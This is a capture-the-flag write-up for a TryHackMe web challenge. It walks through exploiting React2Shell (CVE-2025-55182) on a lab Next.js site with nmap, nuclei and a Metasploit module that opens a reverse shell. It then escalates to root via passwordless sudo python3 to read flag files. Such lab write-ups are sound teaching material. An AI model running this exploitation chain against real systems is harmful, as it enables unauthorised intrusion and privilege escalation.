---
title: "Corp Website"
date: 2026-02-17
categories:
  - THM
tags:
  - "Web"
  - "2026"
  - "React2Shell (CVE-2025-55182)"
  - "CVE Exploit"
platform: THM 2026
competition_year: 2026
header:
  teaser: /assets/images/teasers/web.png
toc: true
toc_sticky: true
---

# 🌐 Love at First Breach 2026 - Corp Website

|Category         |	Author                |
|-----------------|-----------------------|
|🌐 Web         |TryHackMe      |

## Challenge Prompt
My Dearest Hacker,

Valentine's Day is fast approaching, and "Romance & Co" are gearing up for their busiest season.

Behind the scenes, however, things are going wrong. Security alerts suggest that "Romance & Co" has already been compromised. Logs are incomplete, developers defensive and Shareholders want answers now!

As a security analyst, your mission is to retrace the attacker's, uncover how the attackers exploited the vulnerabilities found on the "Romance & Co" web application and determine exactly how the breach occurred.

You can find the web application here: `http://MACHINE_IP:3000`


## Problem Type
- React2Shell (CVE-2025-55182)
- CVE Exploit

## Solve
Upon visiting the page we see Romance & Co.<br>
I started this one with a quick nmap using `nmap -p 3000 -T4 -A SITE_IP`
<img width="1360" height="743" alt="2026-02-14_23-18-14" src="https://github.com/user-attachments/assets/0a9251b7-0cd1-4501-89ff-2d0d33f0d5f3" />


I spent a lot of time playing with different things on the site, running FFUF, etc but I noticed this one is made with Next.js.
I decided to run nuclei with `nuclei -u http://SITE_IP:3000` to see if there were any vulnerabilities:
<img width="1348" height="491" alt="2026-02-14_23-48-03" src="https://github.com/user-attachments/assets/9d03a1e2-ab15-48ba-b8d8-9de932659728" />


Jackpot! CVE-2025-55182 is React2Shell, a critical Remote Code Execution (RCE) vulnerability.
From there I moved into Metasploit with `msfconsole`.

Then I ran `search CVE-2025-55182` to see if there were any plug ins to exploit this and there were:
<img width="1337" height="684" alt="2026-02-14_23-52-16" src="https://github.com/user-attachments/assets/f5146f19-ec88-4a9b-972a-dd9dd494fb5b" />

I ran `use 0` to use the exploit. Then `options` to see what I needed to set.
I ran `set RHOSTS SITE_IP`, `set RPORT 3000`, and `set LHOST MY_IP`. Then I ran `exploit` to kick off the attack.

I was able to get a shell as the user `daniel`:
<img width="913" height="159" alt="2026-02-15_00-08-38" src="https://github.com/user-attachments/assets/e2d6db36-7291-4996-99bf-de81c52e6c4c" />


Since we need the user flag, I ran `cd ~` to go to his home directory and then ran an `ls -la` and found the `user.txt` file. `cat` that file out and we get the first flag:<br>
<img width="586" height="153" alt="2026-02-15_00-00-29" src="https://github.com/user-attachments/assets/60b7cf73-9ab2-4419-94e0-4abc2536a2f4" />


Then I ran a `sudo -l` and saw the daniel user can run `python3` as root with no password:
<img width="683" height="169" alt="2026-02-15_00-05-23" src="https://github.com/user-attachments/assets/d81a3482-a3f3-42ca-b0aa-009f0ec1a2a2" />


I then used [GTFO bins Python File Read](https://gtfobins.org/gtfobins/python/#file-read) to see the flag at /root/root.txt:
<img width="529" height="49" alt="2026-02-15_00-06-35" src="https://github.com/user-attachments/assets/8197922e-729b-4e9c-a4ef-14cfb91b8cfe" />

